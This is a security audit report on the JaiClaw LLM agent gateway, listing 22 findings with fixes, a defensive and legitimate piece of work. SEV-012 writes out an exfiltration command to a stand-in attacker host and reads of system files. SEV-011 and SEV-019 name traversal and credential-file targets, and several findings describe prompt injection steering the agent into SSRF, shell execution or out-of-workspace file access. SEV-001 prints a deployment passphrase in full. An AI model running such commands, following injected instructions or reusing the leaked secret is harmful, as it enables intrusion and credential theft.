# JaiClaw Security Scan Report

**Date:** 2026-05-13
**Scope:** Full codebase -- 42+ modules (core, channels, extensions, apps, tools, starters, examples)
**Scanner:** OWASP dependency-check-maven 12.2.2 + manual static analysis across all source files

## Executive Summary

JaiClaw demonstrates a security-conscious architecture with opt-in hardening controls (SSRF guard, workspace boundary, timing-safe API keys, webhook signature verification, environment sanitization for spawned processes). However, several critical issues were identified: **live API keys and credentials are present in local `.env` files** (untracked by git but accessible on disk), the **OWASP scan detected 7 CVEs in Spring Boot 3.5.13 and Spring Framework 6.2.17** (two rated HIGH at CVSS 7.5), **security hardening is entirely opt-in with unsafe defaults** (timing-safe comparison off, SSRF protection off, webhook verification off), and **rate limiting is unavailable in API key mode**. The codebase has no HTTP security headers (HSTS, CSP, X-Frame-Options) and no method-level authorization annotations anywhere.

## Summary Statistics

| Severity | Count |
|----------|-------|
| Critical |   2   |
| High     |   5   |
| Medium   |   7   |
| Low      |   5   |
| Info     |   3   |

**Total findings:** 22

## Findings

### [SEV-001] Live API Keys and Credentials in `.env` Files -- CRITICAL

**Category:** CWE-798 (Use of Hard-coded Credentials)
**Affected:**
- `docker-compose/.env:7` -- Anthropic API key `sk-ant-api03-pnSw...`
- `docker-compose/.env:13` -- Gemini API key `AIzaSy...`
- `docker-compose/.env:15` -- MiniMax API key (commented but present)
- `docker-compose/.env:22` -- Second Anthropic/MiniMax API key
- `docker-compose/.env:27` -- Third API key
- `docker-compose/.env:53` -- JaiClaw API key
- `docker-compose/.env:60` -- Telegram bot token
- `maven-central-deploy/.env:3-4` -- Central Portal token username/password
- `maven-central-deploy/.env:8` -- GPG passphrase `jaiclaw2026!`

**Description:** Multiple live API keys, tokens, and deployment credentials are stored in plaintext in `.env` files. While these files are listed in `.gitignore` and are not tracked by git, they exist on the local filesystem and are accessible to any process with read access. The `docker-compose/.env` contains multiple overlapping entries with duplicate variables (e.g., `ANTHROPIC_BASE_URL` and `ANTHROPIC_API_KEY` appear multiple times), suggesting accumulated credentials from different configurations.

**Risk:** An attacker with filesystem access (compromised developer machine, leaked backup, or shared CI/CD runner) gains access to production API keys, a Telegram bot token, Maven Central publishing credentials, and a GPG passphrase. The Anthropic and MiniMax API keys could be used to incur significant charges. The Maven Central credentials could be used to publish malicious artifacts.

**Remediation:**
1. Rotate all exposed credentials immediately (Anthropic, Gemini, MiniMax, Telegram bot token, Central Portal token, GPG key)
2. Move secrets to a proper secrets manager (e.g., `1Password CLI`, `aws secretsmanager`, HashiCorp Vault)
3. Use environment variable injection at runtime instead of `.env` files
4. Add `*.env` (not just `docker-compose/.env`) to `.gitignore` as a catch-all
5. Consider adding a pre-commit hook to detect secrets (e.g., `gitleaks`, `trufflehog`)

---

### [SEV-002] Known CVEs in Spring Boot 3.5.13 and Spring Framework 6.2.17 -- CRITICAL

**Category:** CWE-1395 (Dependency on Vulnerable Third-Party Component)
**Affected:** `pom.xml:59` (`spring-boot.version=3.5.13`)

**Description:** OWASP dependency-check identified 7 CVEs in the current dependency set:

| CVE | Component | CVSS | Severity | Summary |
|-----|-----------|------|----------|---------|
| CVE-2026-40972 | spring-boot-3.5.13 | 7.5 | HIGH | Timing attack on remote secrets via network -- attacker can discover `${random.value}` secrets |
| CVE-2026-40975 | spring-boot-3.5.13 | 7.5 | HIGH | `${random.value}` not cryptographically secure -- unsuitable for secrets |
| CVE-2026-40973 | spring-boot-3.5.13 | 7.0 | HIGH | Local attacker can hijack `ApplicationTemp` directory when session persistence is enabled |
| CVE-2026-40977 | spring-boot-3.5.13 | 6.7 | MEDIUM | `ApplicationPidFileWriter` allows local file corruption via PID file |
| CVE-2026-22740 | spring-core-6.2.17 | 6.5 | MEDIUM | WebFlux multipart temp file leak -- disk exhaustion DoS |
| CVE-2026-22745 | spring-core-6.2.17 | 5.3 | MEDIUM | Spring MVC/WebFlux static resource resolution DoS |
| CVE-2026-22741 | spring-core-6.2.17 | 3.1 | LOW | Static resource cache poisoning |

**Risk:** The HIGH-severity CVEs (CVE-2026-40972, CVE-2026-40975) are particularly concerning if `${random.value}` is used for secret generation, though JaiClaw uses `SecureRandom` for API key generation. The `ApplicationTemp` hijack (CVE-2026-40973) is exploitable by a local attacker.

**Remediation:**
```xml
<!-- Update in pom.xml to the latest patched version -->
<spring-boot.version>3.5.14</spring-boot.version>  <!-- or latest patch -->
```
Check Spring Boot release notes for the fix version for each CVE. Spring Boot 4.0.6+ fixes all four Spring Boot CVEs.

---

### [SEV-003] Security Mode `none` Disables All Authentication -- HIGH

**Category:** CWE-306 (Missing Authentication for Critical Function)
**Affected:**
- `core/jaiclaw-security/src/main/java/io/jaiclaw/security/JaiClawSecurityAutoConfiguration.java:150-162`
- `apps/jaiclaw-gateway-app/src/main/resources/application.yml:6`

**Description:** Setting `jaiclaw.security.mode=none` completely disables authentication on all endpoints, including `/api/chat`, `/mcp/**`, and WebSocket endpoints. The only protection is a startup warning log message. There is no guard preventing `none` mode in production deployments -- any misconfiguration or environment variable override (`JAICLAW_SECURITY_MODE=none`) opens all endpoints.

**Risk:** An attacker who can influence the environment (shared host, container escape, misconfigured deployment) can disable all authentication. This grants unauthenticated access to the LLM agent, all MCP tools, shell execution tools, and channel messaging.

**Remediation:**
```java
// In NoneSecurityConfiguration, add a production guard:
@ConditionalOnProperty(name = "jaiclaw.security.mode", havingValue = "none")
@ConditionalOnProperty(name = "jaiclaw.security.allow-none-mode", havingValue = "true")
static class NoneSecurityConfiguration {
```
Alternatively, require an explicit opt-in flag and log at ERROR level in production profiles.

---

### [SEV-004] API Key Comparison Not Timing-Safe by Default -- HIGH

**Category:** CWE-208 (Observable Timing Discrepancy)
**Affected:**
- `core/jaiclaw-security/src/main/java/io/jaiclaw/security/ApiKeyAuthenticationFilter.java:84`
- `core/jaiclaw-security/src/main/java/io/jaiclaw/security/JaiClawSecurityProperties.java:29` (default `false`)

**Description:** The default API key comparison uses `String.equals()`, which is vulnerable to timing attacks. The timing-safe comparison using `MessageDigest.isEqual()` exists but is opt-in via `jaiclaw.security.timing-safe-api-key=true`, which defaults to `false`. Since API key mode is the **default** security mode, most deployments use the vulnerable comparison.

**Risk:** An attacker with network access can perform a timing side-channel attack to progressively discover the API key byte by byte. The JaiClaw API key format (`jaiclaw_ak_` + 32 hex chars) has a known prefix, making the attack feasible with approximately 512 requests (32 unknown chars * 16 hex values each).

**Remediation:**
```java
// In JaiClawSecurityProperties compact constructor, change the default:
// Before:
public JaiClawSecurityProperties {
    // ...
}
// After: make timing-safe the default
if (!timingSafeApiKey) {
    // Log a warning that timing-safe is recommended
}
```
Better yet, make `timingSafeApiKey` default to `true` in the record declaration:
```java
// Change the no-arg constructor default:
public JaiClawSecurityProperties() {
    this(false, null, null, null, true, // timingSafeApiKey defaults to true
            new JwtProperties(), new RoleMappingProperties(), new RateLimitProperties());
}
```

---

### [SEV-005] API Key Accepted via Query Parameter -- Logged in URLs and Browser History -- HIGH

**Category:** CWE-598 (Use of GET Request Method with Sensitive Query Strings)
**Affected:** `core/jaiclaw-security/src/main/java/io/jaiclaw/security/ApiKeyAuthenticationFilter.java:68`

**Description:** The `ApiKeyAuthenticationFilter` accepts API keys via the `api_key` query parameter (`request.getParameter(API_KEY_PARAM)`). This causes the API key to appear in:
- Server access logs (URL path + query string)
- Browser history and bookmarks
- Proxy/CDN/load balancer logs
- HTTP `Referer` headers when navigating away
- Monitoring tools (APM, error trackers)

**Risk:** API key leakage through multiple logging and caching layers, any of which could be accessible to unauthorized parties or persisted indefinitely.

**Remediation:**
Remove query parameter support and require header-only authentication:
```java
// In ApiKeyAuthenticationFilter.doFilterInternal():
String providedKey = request.getHeader(API_KEY_HEADER);
// Remove the fallback to request.getParameter(API_KEY_PARAM)
```
If query parameter support is needed for specific use cases (e.g., WebSocket connections), restrict it to those endpoints only.

---

### [SEV-006] No Rate Limiting in API Key Mode -- HIGH

**Category:** CWE-770 (Allocation of Resources Without Limits)
**Affected:** `core/jaiclaw-security/src/main/java/io/jaiclaw/security/JaiClawSecurityAutoConfiguration.java:44-77`

**Description:** The `RateLimitFilter` bean is only created inside the `JwtSecurityConfiguration` class (JWT mode) and requires explicit opt-in via `jaiclaw.security.rate-limit.enabled=true`. In the default API key mode, there is **no rate limiting at all**. Any caller with the API key can send unlimited requests.

**Risk:** An attacker (or compromised integration) with a valid API key can:
1. Exhaust LLM API credits by sending rapid requests
2. Cause denial of service through resource exhaustion
3. Abuse shell execution tools to overwhelm the host

**Remediation:**
Move the `RateLimitFilter` bean creation to a shared configuration that applies to both API key and JWT modes:
```java
// Move RateLimitFilter to a top-level @Configuration in JaiClawSecurityAutoConfiguration
@Bean
@ConditionalOnProperty(name = "jaiclaw.security.rate-limit.enabled", havingValue = "true")
@ConditionalOnMissingBean(RateLimitFilter.class)
RateLimitFilter rateLimitFilter(JaiClawSecurityProperties properties) {
    // ... same implementation
}
```
Also consider enabling rate limiting by default.

---

### [SEV-007] No JWT Secret Minimum Length Enforcement -- HIGH

**Category:** CWE-326 (Inadequate Encryption Strength)
**Affected:** `core/jaiclaw-security/src/main/java/io/jaiclaw/security/JwtTokenValidator.java:28`

**Description:** The JWT secret is passed to `Keys.hmacShaKeyFor()` without any minimum length validation. While JJWT's `Keys.hmacShaKeyFor()` will throw `WeakKeyException` for secrets shorter than 256 bits (32 bytes), the error message is cryptic and occurs at runtime. There is no explicit validation, documentation of requirements, or guidance for operators.

The only validation is in `JaiClawSecurityAutoConfiguration.java:89-92` which checks for null/blank but not length:
```java
if (jwt.secret() == null || jwt.secret().isBlank()) {
    throw new IllegalStateException("jaiclaw.security.jwt.secret must be set...");
}
```

**Risk:** A short or weak JWT secret (e.g., "mysecret") can be brute-forced, allowing an attacker to forge JWT tokens with arbitrary tenant IDs, roles, and subjects. This bypasses all authorization and tenant isolation.

**Remediation:**
```java
// In JwtSecurityConfiguration.jwtTokenValidator():
String secret = jwt.secret();
if (secret.length() < 32) {
    throw new IllegalStateException(
        "jaiclaw.security.jwt.secret must be at least 32 characters (256 bits) for HMAC-SHA256");
}
```

---

### [SEV-008] SSRF Protection Disabled by Default in WebFetchTool -- MEDIUM

**Category:** CWE-918 (Server-Side Request Forgery)
**Affected:**
- `core/jaiclaw-tools/src/main/java/io/jaiclaw/tools/builtin/WebFetchTool.java:45-46` (constructor defaults `ssrfProtection=false`)
- `apps/jaiclaw-gateway-app/src/main/resources/application-security-hardened.yml:12`

**Description:** The `WebFetchTool` has a well-implemented `SsrfGuard` that blocks requests to private IPs, localhost, link-local, and cloud metadata endpoints. However, SSRF protection is **disabled by default** and only enabled via the `security-hardened` profile (`jaiclaw.tools.web.ssrf-protection: true`). The default constructor creates an unprotected instance.

**Risk:** An LLM agent (via prompt injection or adversarial input) can instruct the `web_fetch` tool to access internal services, cloud metadata endpoints (169.254.169.254), or localhost services. This can leak cloud credentials (AWS IAM role tokens), internal service data, or enable port scanning.

**Remediation:**
Change the default to `true`:
```java
public WebFetchTool() {
    this(true); // SSRF protection enabled by default
}
```

---

### [SEV-009] Webhook Endpoints Lack Signature Verification by Default -- MEDIUM

**Category:** CWE-345 (Insufficient Verification of Data Authenticity)
**Affected:**
- `core/jaiclaw-security/src/main/java/io/jaiclaw/security/JaiClawSecurityAutoConfiguration.java:69` -- `/webhook/**` is `permitAll()`
- `channels/jaiclaw-channel-slack/src/main/java/io/jaiclaw/channel/slack/SlackAdapter.java:334` -- `verifySignature` defaults to `false`
- `channels/jaiclaw-channel-telegram/src/main/java/io/jaiclaw/channel/telegram/TelegramAdapter.java:417` -- `verifyWebhook` defaults to `false`

**Description:** All webhook endpoints (`/webhook/**`) are excluded from authentication in the Spring Security filter chain via `permitAll()`. The channel-specific signature verification (Slack HMAC-SHA256, Telegram secret token) exists but is disabled by default. An attacker can send forged webhook payloads to trigger agent responses, inject messages, or abuse the LLM API quota.

**Risk:** Without webhook signature verification, any attacker who discovers the webhook URL can:
1. Impersonate channel users to the agent
2. Trigger unlimited LLM requests, exhausting API credits
3. Inject malicious content into conversation sessions

**Remediation:**
Enable webhook verification by default when the channel has a signing secret configured:
```java
// In SlackAdapter, auto-enable when signingSecret is set:
boolean shouldVerify = config.verifySignature() || !config.signingSecret().isBlank();
```
Or change the default to `true` in the security-hardened profile documentation and recommend it for production.

---

### [SEV-010] No HTTP Security Response Headers Configured -- MEDIUM

**Category:** CWE-693 (Protection Mechanism Failure)
**Affected:** `core/jaiclaw-security/src/main/java/io/jaiclaw/security/JaiClawSecurityAutoConfiguration.java` (all three filter chain configurations)

**Description:** None of the three security filter chains (API key, JWT, none) configure HTTP security response headers. Spring Security's default headers (X-Content-Type-Options, X-Frame-Options, Cache-Control) are available but not explicitly configured. Critical headers are missing:
- **Strict-Transport-Security (HSTS)** -- not set
- **Content-Security-Policy (CSP)** -- not set
- **X-Frame-Options** -- relies on Spring Security defaults (DENY), but not explicitly configured
- **Referrer-Policy** -- not set
- **Permissions-Policy** -- not set

**Risk:** Without HSTS, connections may be downgraded to HTTP, exposing API keys and JWT tokens in transit. Without CSP, the canvas module's HTML rendering is vulnerable to XSS. Missing Referrer-Policy allows API key leakage via the `Referer` header.

**Remediation:**
```java
// Add to each SecurityFilterChain:
.headers(headers -> headers
    .httpStrictTransportSecurity(hsts -> hsts.includeSubDomains(true).maxAgeInSeconds(31536000))
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'"))
    .referrerPolicy(referrer -> referrer.policy(ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
)
```

---

### [SEV-011] Canvas File Manager Lacks Path Traversal Protection -- MEDIUM

**Category:** CWE-22 (Path Traversal)
**Affected:**
- `extensions/jaiclaw-canvas/src/main/java/io/jaiclaw/canvas/CanvasFileManager.java:67-76` (`writeHtml`)
- `extensions/jaiclaw-canvas/src/main/java/io/jaiclaw/canvas/CanvasFileManager.java:78-87` (`readHtml`)

**Description:** Both `writeHtml(String id, String html)` and `readHtml(String fileName)` resolve paths using `resolveDir().resolve(fileName)` without validating that the resolved path stays within the canvas directory. The `id` parameter in `writeHtml` and `fileName` in `readHtml` could contain path traversal sequences like `../../etc/passwd`.

While the `writeHtml()` no-arg variant generates a UUID (safe), the two-arg variant accepts an arbitrary `id` that is used directly in path construction.

**Risk:** If an LLM agent is instructed (via prompt injection) to write HTML with a crafted ID like `../../../../tmp/evil`, it could write files outside the canvas directory. Similarly, `readHtml` could be used to read arbitrary files.

**Remediation:**
```java
public String writeHtml(String id, String html) {
    // Validate no path separators in the ID
    if (id.contains("/") || id.contains("\\") || id.contains("..")) {
        throw new SecurityException("Invalid canvas file ID: " + id);
    }
    String fileName = id + ".html";
    Path resolved = resolveDir().resolve(fileName).normalize();
    if (!resolved.startsWith(resolveDir())) {
        throw new SecurityException("Path traversal blocked: " + id);
    }
    // ... write file
}
```

---

### [SEV-012] Shell Execution Default Policy is `deny-dangerous` (Not Allowlist) -- MEDIUM

**Category:** CWE-78 (OS Command Injection)
**Affected:**
- `core/jaiclaw-tools/src/main/java/io/jaiclaw/tools/exec/ExecPolicyConfig.java:31-33`
- `core/jaiclaw-tools/src/main/java/io/jaiclaw/tools/builtin/ShellExecTool.java:84`

**Description:** The default `ExecPolicyConfig` uses `deny-dangerous` policy, which only blocks shell metacharacters (`;|&\`<>`) and a small set of destructive patterns (`rm -rf /`, `mkfs`, `> /dev/sd`). This permits any single command without metacharacters, including sensitive operations like `curl`, `wget`, `cat /etc/shadow`, `env` (to dump environment), `printenv`, and any binary on PATH.

The `deny-dangerous` policy blocks piping but not individual dangerous commands. An LLM agent (via prompt injection) could execute:
- `cat /etc/passwd`
- `curl http://attacker.com/exfil`
- `env` (if SafeProcessEnvironment didn't clear the env)

**Risk:** While `SafeProcessEnvironment.apply()` mitigates env var leakage, the default policy is too permissive for production. Any command that does not use metacharacters is allowed.

**Remediation:**
Change the default policy to `allowlist` for production deployments:
```yaml
jaiclaw:
  tools:
    exec:
      policy: allowlist
      allowed-commands: [git, ls, find, grep, cat, head, tail, wc]
```
Document that `deny-dangerous` should only be used in development.

---

### [SEV-013] `anyRequest().permitAll()` Catch-All in Security Filter Chains -- MEDIUM

**Category:** CWE-862 (Missing Authorization)
**Affected:**
- `core/jaiclaw-security/src/main/java/io/jaiclaw/security/JaiClawSecurityAutoConfiguration.java:72`
- `core/jaiclaw-security/src/main/java/io/jaiclaw/security/JaiClawSecurityAutoConfiguration.java:135`

**Description:** Both the API key and JWT security filter chains end with `.anyRequest().permitAll()`. This means any endpoint not explicitly matched by `/api/**` or `/mcp/**` patterns is accessible without authentication. This includes:
- Static resources served by Spring Boot
- Any custom endpoints added by extensions or plugins
- Actuator endpoints if enabled
- Canvas file serving endpoints

New endpoints added by developers that do not start with `/api/` or `/mcp/` will silently be publicly accessible.

**Risk:** Future endpoints or plugin-contributed endpoints could inadvertently be exposed without authentication. The current WebSocket handler at `/ws/session/**` would fall under `anyRequest().permitAll()` if registered.

**Remediation:**
Change the catch-all to deny by default:
```java
.anyRequest().denyAll()  // or .anyRequest().authenticated()
```
Then explicitly permit only known public paths (health checks, static resources).

---

### [SEV-014] No Method-Level Authorization Annotations -- MEDIUM

**Category:** CWE-285 (Improper Authorization)
**Affected:** All REST controllers across the codebase (no `@PreAuthorize`, `@Secured`, or `@RolesAllowed` annotations found)

**Description:** The codebase relies entirely on URL-pattern-based authorization in the `SecurityFilterChain`. There are no method-level security annotations (`@PreAuthorize`, `@Secured`, `@RolesAllowed`) on any controller methods. In JWT mode with role-based tool profile filtering (`RoleToolProfileResolver`), the roles are used for tool filtering but not for endpoint-level access control.

**Risk:** All authenticated users have identical access to all endpoints. There is no way to restrict specific API operations to specific roles (e.g., admin-only MCP tool execution, read-only user access).

**Remediation:**
Enable method-level security and add annotations:
```java
@EnableMethodSecurity(prePostEnabled = true)
public class JaiClawSecurityAutoConfiguration { ... }

// In McpController:
@PreAuthorize("hasRole('ADMIN') or hasRole('MCP_USER')")
@PostMapping("/{serverName}/tools/{toolName}")
public ResponseEntity<Map<String, Object>> executeTool(...) { ... }
```

---

### [SEV-015] Voice Call WebSocket Allows All Origins -- LOW

**Category:** CWE-346 (Origin Validation Error)
**Affected:** `extensions/jaiclaw-voice-call/src/main/java/io/jaiclaw/voicecall/config/VoiceCallAutoConfiguration.java:106`

**Description:** The voice call media stream WebSocket handler is registered with `.setAllowedOrigins("*")`, permitting connections from any origin. This allows cross-site WebSocket hijacking attacks.

**Risk:** A malicious web page could establish a WebSocket connection to the voice call media stream endpoint, potentially intercepting or injecting audio data.

**Remediation:**
```java
registry.addHandler(handler, "/voice/media-stream")
    .setAllowedOrigins(voiceCallProperties.getAllowedOrigins()); // configure per deployment
```

---

### [SEV-016] Async Code in Extensions Missing Tenant Context Propagation -- LOW

**Category:** CWE-668 (Exposure of Resource to Wrong Sphere)
**Affected:**
- `extensions/jaiclaw-subscription/src/main/java/io/jaiclaw/subscription/SubscriptionExpiryScheduler.java:39` -- `ScheduledExecutorService` without `TenantContextPropagator`
- `extensions/jaiclaw-voice-call/src/main/java/io/jaiclaw/voicecall/telephony/twilio/TwilioTelephonyProvider.java:146` -- `CompletableFuture.supplyAsync()` without `TenantContextPropagator.wrap()`
- `extensions/jaiclaw-voice-call/src/main/java/io/jaiclaw/voicecall/store/JsonlCallStore.java:36` -- Background writer thread without tenant context
- `core/jaiclaw-gateway/src/main/java/io/jaiclaw/gateway/mcp/transport/SseMcpToolProvider.java:70` -- `new Thread()` for SSE reader without tenant propagation

**Description:** Several extensions create async tasks (via `CompletableFuture.supplyAsync()`, `ScheduledExecutorService`, or `new Thread()`) without using `TenantContextPropagator.wrap()`. The core modules (`HookRunner`, `AgentRuntime`) correctly use `TenantContextPropagator`, but extensions do not follow this pattern. While `TenantContextPropagator` exists and is used in core, there is no mechanism to enforce its use in extensions.

**Risk:** In multi-tenant mode, async operations in these extensions could execute without tenant context, potentially accessing or modifying data belonging to the wrong tenant.

**Remediation:**
Wrap all async operations in extensions with `TenantContextPropagator`:
```java
// In TwilioTelephonyProvider:
return CompletableFuture.supplyAsync(TenantContextPropagator.wrap(() -> {
    // ... existing code
}));
```

---

### [SEV-017] `TenantContextHolder` Used Directly Instead of `TenantGuard` -- LOW

**Category:** Best Practice Deviation
**Affected:** Multiple locations in `core/jaiclaw-gateway` and `extensions`:
- `core/jaiclaw-gateway/src/main/java/io/jaiclaw/gateway/GatewayService.java:181,243`
- `core/jaiclaw-gateway/src/main/java/io/jaiclaw/gateway/GatewayController.java:56`
- `core/jaiclaw-gateway/src/main/java/io/jaiclaw/gateway/mcp/McpController.java:95,109,155,166`
- `core/jaiclaw-gateway/src/main/java/io/jaiclaw/gateway/mcp/transport/server/McpSseServerController.java:198,216,255,276`
- `extensions/jaiclaw-messaging/src/main/java/io/jaiclaw/messaging/mcp/MessagingMcpToolProvider.java:75,96`
- `extensions/jaiclaw-cron/src/main/java/io/jaiclaw/cron/CronJobExecutor.java:38,50`
- `extensions/jaiclaw-cron-manager/src/main/java/io/jaiclaw/cronmanager/agent/CronAgentFactory.java:54,71`

**Description:** Per the project's multi-tenancy conformance guidelines, new components should inject `TenantGuard` rather than calling `TenantContextHolder` directly. Many components across the gateway and extensions still use `TenantContextHolder.set()` and `TenantContextHolder.clear()` directly.

**Risk:** Direct `TenantContextHolder` usage bypasses the `TenantGuard` abstraction, which provides mode-aware (SINGLE/MULTI) behavior. This makes it harder to enforce consistent tenant isolation and adds risk of forgetting to clear the context (resource leak).

**Remediation:**
Refactor to use `TenantGuard` injection and its helper methods. This is a gradual improvement rather than a critical fix.

---

### [SEV-018] Teams Channel `skipJwtValidation` Flag -- LOW

**Category:** CWE-306 (Missing Authentication for Critical Function)
**Affected:**
- `channels/jaiclaw-channel-teams/src/main/java/io/jaiclaw/channel/teams/TeamsAdapter.java:144`
- `apps/jaiclaw-gateway-app/src/main/resources/application.yml:156` (defaults to `false`)

**Description:** The Teams channel adapter has a `skip-jwt-validation` configuration flag that, when set to `true`, disables JWT validation on incoming Teams webhook requests. While it defaults to `false`, there is no warning when it is set to `true`, and no guard against using it in production.

**Risk:** Enabling `skip-jwt-validation` allows anyone to send forged Teams Bot Framework activity messages, impersonating any Teams user.

**Remediation:**
Add a startup warning (similar to `SecurityModeLogger`) when `skipJwtValidation` is `true`, and document that it should only be used for local development/testing.

---

### [SEV-019] Workspace Boundary Enforcement Opt-In for Code Tools -- LOW

**Category:** CWE-22 (Path Traversal)
**Affected:**
- `extensions/jaiclaw-code/src/main/java/io/jaiclaw/code/GlobTool.java:44,50` -- `enforceWorkspaceBoundary` parameter
- `extensions/jaiclaw-code/src/main/java/io/jaiclaw/code/FileEditTool.java:46,52`
- `extensions/jaiclaw-code/src/main/java/io/jaiclaw/code/GrepTool.java:57,63`

**Description:** The code tools (GlobTool, FileEditTool, GrepTool) accept an `enforceWorkspaceBoundary` parameter that defaults to `false` in the constructor. The `WorkspaceBoundary.resolve()` check is only applied when this flag is `true`. This means by default, these tools can read and write files anywhere on the filesystem.

**Risk:** An LLM agent could be instructed (via prompt injection) to read sensitive files outside the workspace (e.g., `~/.ssh/id_rsa`, `/etc/shadow`) or modify system files.

**Remediation:**
Change the default to `true`:
```java
public FileEditTool() {
    this(true); // enforce workspace boundary by default
}
```

---

### [SEV-020] In-Memory Rate Limiter Not Cluster-Safe -- INFO

**Category:** Architecture Observation
**Affected:** `core/jaiclaw-security/src/main/java/io/jaiclaw/security/RateLimitFilter.java:33`

**Description:** The rate limiter uses an in-memory `ConcurrentHashMap` for tracking request counts. In a multi-instance deployment (horizontal scaling, Kubernetes), each instance maintains its own independent counter. An attacker can send requests round-robin across instances to bypass the rate limit.

**Risk:** Minimal in single-instance deployments. In clustered deployments, the effective rate limit is multiplied by the number of instances.

**Remediation:**
For clustered deployments, consider Redis-backed rate limiting (e.g., `spring-boot-starter-data-redis` + `bucket4j` or `resilience4j`).

---

### [SEV-021] Shell Commands Logged at INFO Level -- INFO

**Category:** CWE-532 (Insertion of Sensitive Information into Log File)
**Affected:**
- `core/jaiclaw-tools/src/main/java/io/jaiclaw/tools/builtin/ShellExecTool.java:82`
- `core/jaiclaw-tools/src/main/java/io/jaiclaw/tools/builtin/WhitelistedCommandTool.java:105`
- `core/jaiclaw-tools/src/main/java/io/jaiclaw/tools/builtin/ClaudeCliTool.java:124`

**Description:** All shell execution tools log the full command at INFO level. While SLF4J parameterized logging prevents format-string injection, the command content itself may contain sensitive data (file paths, API keys passed as arguments, database connection strings).

**Risk:** Low -- logs may capture sensitive command arguments. SLF4J parameterized logging mitigates log injection.

**Remediation:**
Log at DEBUG level instead of INFO, or truncate/redact sensitive arguments.

---

### [SEV-022] WebSocket Handler Does Not Set Tenant Context -- INFO

**Category:** CWE-668 (Exposure of Resource to Wrong Sphere)
**Affected:** `core/jaiclaw-gateway/src/main/java/io/jaiclaw/gateway/WebSocketSessionHandler.java:53`

**Description:** The `WebSocketSessionHandler.handleTextMessage()` calls `gatewayService.handleAsync()` without setting `TenantContextHolder`. The `handleAsync` method javadoc states "Caller must set TenantContextHolder before calling this method." The WebSocket handler does not extract or set any tenant context from the WebSocket session.

**Risk:** In multi-tenant mode, WebSocket-connected sessions would execute without tenant isolation, potentially accessing the wrong tenant's data. Currently mitigated because `AgentRuntime.run()` uses `TenantContextPropagator.wrap()` which captures the (empty) context.

**Remediation:**
Extract tenant information from the WebSocket handshake headers or session attributes and set `TenantContextHolder` before calling `handleAsync`.

---

## Strengths

- **Environment sanitization for spawned processes**: `SafeProcessEnvironment.apply()` clears all inherited environment variables from `ProcessBuilder` instances and restores only a minimal safe set (PATH, HOME, etc.), preventing API key leakage to child processes. This is applied consistently across `ShellExecTool`, `WhitelistedCommandTool`, `ClaudeCliTool`, and `KubectlExecTool`.

- **Tenant context propagation framework**: `TenantContextPropagator` provides `wrap()` methods for `Supplier` and `Runnable` to correctly propagate `TenantContext` across thread boundaries. Core modules (`HookRunner`, `AgentRuntime`) use this consistently.

- **Well-implemented SSRF guard**: `SsrfGuard` checks for loopback, site-local, link-local, any-local addresses, and cloud metadata endpoints (169.254.169.254, fc00::/7). DNS resolution is performed to catch hostname-based bypasses.

- **API key auto-generation and file persistence**: `ApiKeyProvider` generates keys using `SecureRandom` with a distinctive prefix format, auto-persists to `~/.jaiclaw/api-key`, and provides masked display for logs.

- **Command policy framework**: `CommandPolicy` provides three modes (unrestricted, allowlist, deny-dangerous) with token-boundary-aware prefix matching to prevent bypass attacks. The kubectl policy has verb-level filtering with built-in blocked verbs.

- **Workspace boundary protection**: `WorkspaceBoundary.resolve()` normalizes paths and validates they stay within the workspace directory, preventing path traversal when enabled.

- **Security-hardened profile**: A comprehensive `application-security-hardened.yml` profile enables all security flags at once, providing a clear path to production hardening.

- **Secrets not committed to git**: `.gitignore` correctly excludes `.env` files, `maven-central-deploy/`, and other sensitive paths. No credentials were found in tracked files.

- **Stateless session management**: All security filter chains use `SessionCreationPolicy.STATELESS`, eliminating CSRF risk for the stateless REST API design.

- **Structured security mode logging**: `SecurityModeLogger` provides clear startup visibility into the active security posture, with a prominent warning banner for `none` mode.

## Recommended Next Steps

1. **IMMEDIATE (Critical)**: Rotate all credentials found in `docker-compose/.env` and `maven-central-deploy/.env` -- Anthropic, Gemini, MiniMax API keys; Telegram bot token; Maven Central token; GPG passphrase.

2. **IMMEDIATE (Critical)**: Upgrade Spring Boot from 3.5.13 to the latest patched version to address CVE-2026-40972 (CVSS 7.5) and CVE-2026-40975 (CVSS 7.5).

3. **HIGH PRIORITY**: Change security defaults to secure-by-default:
   - Make `timingSafeApiKey` default to `true`
   - Make `ssrfProtection` default to `true` in `WebFetchTool`
   - Make `enforceWorkspaceBoundary` default to `true` in code tools
   - Enable rate limiting in API key mode (not just JWT mode)

4. **HIGH PRIORITY**: Remove API key query parameter support (`api_key` param) or restrict to WebSocket-only paths.

5. **MEDIUM PRIORITY**: Add HTTP security response headers (HSTS, CSP, X-Frame-Options, Referrer-Policy) to all security filter chains.

6. **MEDIUM PRIORITY**: Change `anyRequest().permitAll()` to `anyRequest().denyAll()` in security filter chains and explicitly allowlist public endpoints.

7. **MEDIUM PRIORITY**: Add path traversal protection to `CanvasFileManager.writeHtml()` and `readHtml()`.

8. **MEDIUM PRIORITY**: Wrap async operations in extensions with `TenantContextPropagator` for multi-tenant safety.

9. **LOW PRIORITY**: Add method-level security annotations (`@PreAuthorize`) for fine-grained access control in JWT mode.

10. **LOW PRIORITY**: Add production guard for `security.mode=none` requiring explicit opt-in flag.

11. **FUTURE**: Consider Redis-backed rate limiting for clustered deployments and add `gitleaks` pre-commit hook to prevent future credential leaks.
